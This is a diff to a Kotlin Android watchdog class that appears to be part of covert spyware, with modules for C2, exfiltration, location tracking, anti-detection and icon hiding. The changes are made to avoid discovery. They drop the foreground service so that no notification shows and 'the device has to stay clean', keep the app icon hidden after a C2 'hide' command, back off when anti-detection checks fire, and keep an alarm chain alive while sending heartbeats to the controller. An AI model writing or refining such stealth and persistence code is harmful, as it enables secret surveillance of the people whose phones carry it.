@@ -1,13 +1,9 @@
 package com.sp.watchdog
 
-import android.app.ActivityManager
 import android.content.Context
-import android.content.Intent
-import android.os.Build
 import android.util.Log
+import com.sp.core.agent.AgentWorker
 import com.sp.core.c2.Exfil
-import com.sp.core.services.C2Service
-import com.sp.core.services.LocationService
 import com.sp.core.stealth.AntiDetect
 import com.sp.core.stealth.IconHider
 import com.sp.core.util.Prefs
@@ -18,40 +14,49 @@ import com.sp.core.util.Prefs
  * Every system broadcast used to trigger an immediate service restart, which
  * made the app an obvious battery/statistics outlier. Now:
  *  - a cool-down window is respected (next allowed run is persisted)
- *  - the interval grows exponentially while the service stays dead
+ *  - the interval grows exponentially while the app keeps dying
  *  - the alarm interval follows the back-off instead of a fixed 60s tick
+ *
+ * The watchdog no longer starts a foreground service - it runs the agent
+ * tick. A foreground service would show a notification on every modern
+ * Android, and the device has to stay clean.
  */
 object HealthCheck {
     private const val TAG = "HealthCheck"
     private const val KEY_FAILS = "hc_fails"
     private const val KEY_NEXT_RUN = "hc_next_run"
 
-    const val BASE_INTERVAL_MS = 60_000L
+    const val BASE_INTERVAL_MS = AgentWorker.TICK_INTERVAL_MS
     const val MAX_INTERVAL_MS = 30 * 60_000L
 
-    fun run(ctx: Context, force: Boolean = false) {
+    /**
+     * Runs the agent tick and returns the interval until the next run.
+     * The caller arms the alarm with it, so the chain never dies.
+     */
+    fun run(ctx: Context, force: Boolean = false): Long {
         val now = System.currentTimeMillis()
 
         if (!force) {
             val next = Prefs.get(ctx, KEY_NEXT_RUN, 0L) as Long
-            if (now < next) return
+            if (now < next) return (next - now).coerceAtLeast(1_000L)
         }
 
-        if (AntiDetect.isCompromised(ctx)) return
+        if (AntiDetect.isCompromised(ctx)) return MAX_INTERVAL_MS
 
-        val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
+        // The icon follows the user's choice - the watchdog must not bring
+        // the icon back after the C2 command "hide". The activity itself
+        // stays enabled, so the app is always startable.
+        try { IconHider.applySaved(ctx) } catch (_: Throwable) {}
 
-        val locOk = isRunning(am, LocationService::class.java.name)
-        val c2Ok = isRunning(am, C2Service::class.java.name)
-
-        if (!locOk) restart(ctx, LocationService::class.java)
-        if (!c2Ok) restart(ctx, C2Service::class.java)
-
-        if (!isAccessibilityEnabled(ctx)) {
-            Exfil.sendLog(ctx, "health", """{"acc":false,"ts":${System.currentTimeMillis()}}""")
+        var alive = true
+        try {
+            AgentWorker.tick(ctx, force = force)
+        } catch (t: Throwable) {
+            alive = false
+            Log.w(TAG, "tick failed: ${t.message}")
         }
 
-        val fails = if (locOk && c2Ok) 0 else (Prefs.get(ctx, KEY_FAILS, 0) as Int + 1).coerceAtMost(6)
+        val fails = if (alive) 0 else (Prefs.get(ctx, KEY_FAILS, 0) as Int + 1).coerceAtMost(6)
         Prefs.set(ctx, KEY_FAILS, fails)
 
         val backoff = if (fails <= 0) BASE_INTERVAL_MS
@@ -59,28 +64,10 @@ object HealthCheck {
 
         Prefs.set(ctx, KEY_NEXT_RUN, now + backoff)
 
-        // The icon follows the user's choice - the watchdog must not bring
-        // the icon back after the C2 command "hide". The activity itself
-        // stays enabled, so the app is always startable.
-        IconHider.applySaved(ctx)
-        WatchdogAlarm.arm(ctx, backoff)
-
         Exfil.sendLog(ctx, "heartbeat",
-            """{"ts":${System.currentTimeMillis()},"sdk":${Build.VERSION.SDK_INT},"fails":$fails,"interval":$backoff}""")
-        Log.i(TAG, "health ok=$locOk/$c2Ok fails=$fails next=${backoff}ms")
-    }
-
-    private fun isRunning(am: ActivityManager, name: String): Boolean {
-        @Suppress("DEPRECATION")
-        return am.getRunningServices(256).any { it.service.className == name }
-    }
-
-    private fun restart(ctx: Context, cls: Class<*>) {
-        try {
-            val i = Intent(ctx, cls)
-            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i) else ctx.startService(i)
-        } catch (_: Throwable) {
-        }
+            """{"ts":${System.currentTimeMillis()},"fails":$fails,"interval":$backoff}""")
+        Log.i(TAG, "alive=$alive fails=$fails next=${backoff}ms")
+        return backoff
     }
 
     private fun isAccessibilityEnabled(ctx: Context): Boolean {
